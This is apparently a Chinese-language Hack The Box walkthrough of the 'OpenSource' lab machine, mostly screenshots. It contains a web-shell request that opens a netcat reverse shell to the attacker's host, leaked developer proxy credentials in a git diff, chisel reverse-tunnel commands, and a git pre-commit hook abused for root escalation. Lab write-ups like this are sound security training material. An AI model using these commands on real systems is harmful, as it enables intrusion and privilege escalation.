---
layer: article
title: hackthebox OpenSource
tags: pentest hackthebox Walkthrough 
---

靶机链接：<https://app.hackthebox.com/machines/OpenSource>

## 环境配置

| 名称             | IP           |
| ---------------- | ------------ |
| OpenSource       | 10.10.11.164 |
| Kali Linux       | 10.10.14.8   |
| My Ubuntu Server | 192.168.1.13 |

![1](https://static.iihack.com/hackthebox/machines/OpenSource/1.jpg)



![2](https://static.iihack.com/hackthebox/machines/OpenSource/2.jpg)





![3](https://static.iihack.com/hackthebox/machines/OpenSource/3.jpg)



![4](https://static.iihack.com/hackthebox/machines/OpenSource/4.jpg)



![5](https://static.iihack.com/hackthebox/machines/OpenSource/5.jpg)



![6](https://static.iihack.com/hackthebox/machines/OpenSource/6.jpg)



![7](https://static.iihack.com/hackthebox/machines/OpenSource/7.jpg)

![8](https://static.iihack.com/hackthebox/machines/OpenSource/8.jpg)





```http
http://10.10.11.164/shell?cmd=nc 10.10.14.8 444 -e /bin/sh
```

![9](https://static.iihack.com/hackthebox/machines/OpenSource/9.jpg)



```bash
$ git checkout dev
$ git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820
diff --git a/.gitignore b/.gitignore
deleted file mode 100644
index e50a290..0000000
--- a/.gitignore
+++ /dev/null
@@ -1,26 +0,0 @@
-.DS_Store
-.env
-.flaskenv
-*.pyc
-*.pyo
-env/
-venv/
-.venv/
-env*
-dist/
-build/
-*.egg
-*.egg-info/
-_mailinglist
-.tox/
-.cache/
-.pytest_cache/
-.idea/
-docs/_build/
-.vscode
-
-# Coverage reports
-htmlcov/
-.coverage
-.coverage.*
-*,cover
diff --git a/Dockerfile b/Dockerfile
index 0875eda..76c7768 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-ENV FLASK_DEBUG=1
+# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}

```

发现用户名密码




```
┌──(kali㉿kali)-[~/]
└─$ sudo ./chisel_1.7.7_linux_amd64 server --port 3000 -v --reverse --socks5

┌──(vict㉿target)-[~/tmp]
└─$ ./chisel_1.7.7_linux_amd64 client 10.10.14.8:3000 R:5000:socks

```

![10](https://static.iihack.com/hackthebox/machines/OpenSource/10.jpg)

![11](https://static.iihack.com/hackthebox/machines/OpenSource/11.jpg)



## 提权

![12](https://static.iihack.com/hackthebox/machines/OpenSource/12.jpg)









```
$ cat /home/dev01/.git/hooks/pre-commit

#!/bin/bash
touch /tmp/te
/usr/bin/python3 /tmp/r555.py
```





```
$ chmod +x  /home/dev01/.git/hooks/pre-commit
```



等定时任务执行后，就可以获得root shell成功

![13](https://static.iihack.com/hackthebox/machines/OpenSource/13.jpg)
